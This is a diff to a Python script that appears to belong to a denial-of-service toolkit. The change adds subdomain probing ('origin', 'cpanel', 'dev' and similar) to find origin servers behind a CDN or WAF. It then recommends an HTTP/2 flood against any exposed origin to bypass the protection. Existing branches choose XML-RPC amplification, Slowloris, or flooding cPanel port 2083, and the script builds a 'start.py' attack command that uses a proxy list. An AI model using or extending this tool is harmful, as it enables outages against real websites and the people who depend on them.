@@ -219,7 +219,29 @@ def run_intel():
         if cdn_guess != "Unknown":
             print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")
 
-        # Phase 4: Tacitcal Recommendation
+        # [PHASE 19] Zone Hunter (Subdomain Discovery)
+        print(f"\n{bcolors.OKCYAN}Phase 4: Zone Hunter (Origin Discovery)...{bcolors.RESET}")
+        common_subs = ["origin", "direct", "cpanel", "mail", "dev", "test", "api", "ftp", "beta", "admin", "secure", "www1", "web"]
+        exposed_origin = None
+        
+        try:
+            for sub in common_subs:
+                sub_domain = f"{sub}.{target_domain}"
+                try:
+                    sub_ip = socket.gethostbyname(sub_domain)
+                    # Check if IP is different from main (indicating potential bypass)
+                    if sub_ip != resolved_ip:
+                        print(f"[*] Found {sub_domain:<25} : {bcolors.FAIL}{sub_ip} (POTENTIAL ORIGIN!){bcolors.RESET}")
+                        if not exposed_origin and cdn_guess != "Unknown":
+                            exposed_origin = sub_domain # Save first candidate
+                    else:
+                        print(f"[*] Found {sub_domain:<25} : {bcolors.OKGREEN}{sub_ip} (Same as Main){bcolors.RESET}")
+                except:
+                    pass
+        except Exception as e:
+            print(f"[!] Zone Hunter Error: {e}")
+
+        # Phase 5: Tactical Recommendation
         print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
         
         rec_method = "H2_FLOOD"
@@ -229,23 +251,28 @@ def run_intel():
         if vuln_vector == "XMLRPC":
             rec_method = "XMLRPC"
             reason = "CRITICAL: XML-RPC Amplification detected! Most damage per request."
-            # XMLRPC defaults: threads=100, rpc=50
             args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
+        
+        elif exposed_origin:
+            rec_method = "H2_FLOOD (Origin Bypass)"
+            reason = f"EXPOSED ORIGIN FOUND! Attack {exposed_origin} to bypass {cdn_guess}."
+            target_url = f"https://{exposed_origin}"
+            args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
+            
         elif "Apache" in server_header and cdn_guess == "Unknown":
             rec_method = "SLOW"
             reason = "Apache Target without WAF is vulnerable to Slowloris."
-            # SLOW defaults: threads=100, rpc=1000 (Keep-Alive)
             args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
+        
         elif 2083 in open_ports or 2087 in open_ports:
-            rec_method = "H2_FLOOD"
-            # Adjust target to port 2083
+            rec_method = "H2_FLOOD (Backend)"
             target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
             reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
-            # H2_FLOOD defaults
-            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
+            args = ["H2_FLOOD", target_url, "7", "100", "proxy.txt", "50", "800"]
+            
         else:
-             # Default H2_FLOOD
              args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
+
 
         cmd_string = f"python3 start.py {' '.join(args)}"
 
